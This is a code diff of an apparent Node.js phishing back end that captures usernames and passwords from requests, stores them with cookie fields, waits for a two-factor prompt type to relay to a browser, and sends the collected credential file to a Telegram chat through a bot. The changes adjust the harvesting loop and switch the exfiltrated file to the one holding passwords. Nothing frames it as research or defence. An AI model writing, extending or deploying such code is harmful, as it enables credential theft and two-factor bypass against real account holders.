@@ -19,7 +19,7 @@ async function handleRequest(req, res) {
     const username = req.params.username;
     const password = req.params.password;
 
-    jsonData[username] = null;
+    jsonData["username"] = username;
     jsonData[username+'_cookies'] = null;
     jsonData[username+'_pass'] = password;
     typeJsonData[username] = null;
@@ -38,6 +38,7 @@ async function handleRequest(req, res) {
         }
         if (type !== null && type !== 404) {
             console.log('success creds');
+            // sendJsonFile()
             res.json({ message: 'Login request sent to browser', twofatype: type });
         }
 }
@@ -93,13 +94,14 @@ async function checkJson() {
 async function checkValue(key) {
     const filePath = './data/type.json';
     const startTime = Date.now();
+    console.log("start: "+startTime)
     while (true) {
         try {
-            if (Date.now() - startTime >= 30000) {
-                console.log('20 seconds have passed');
-                return 404;
-                break; // Exit the loop if 10 seconds have passed
-            }
+            // if (Date.now() - startTime >= 40000) {
+            //     console.log('40 seconds have passed');
+            //     return 404;
+            //     break; // Exit the loop if 10 seconds have passed
+            // }
             console.log('instance 1')
             // Read the file asynchronously
             const data = await fs.readFile(filePath, 'utf8');
@@ -111,6 +113,7 @@ async function checkValue(key) {
             if (jsonData[key] !== null) {
                 // If the value is not null, send a response
                 console.log(`Value for key "${key}" is not null: ${jsonData[key]}`);
+                console.log("duration: "+Date.now() - startTime)
                 // Here you can send a response using any method you prefer
                 return jsonData[key];
                 break; // Exit the loop once the value is not null
@@ -200,11 +203,11 @@ async function sendJsonFile() {
     console.log('yooooo111');
     const bot = new TelegramBot(token, {polling: true});
     try {
-        await fs.access(typeFilePath);  // Waits for the file check
+        await fs.access(filePath);  // Waits for the file check
         console.log('yooooo222');
 
         // Send the JSON file to the user
-        await bot.sendDocument(userChatId, typeFilePath)
+        await bot.sendDocument(userChatId, filePath)
             .then(() => {
                 console.log("File sent successfully!");
             })
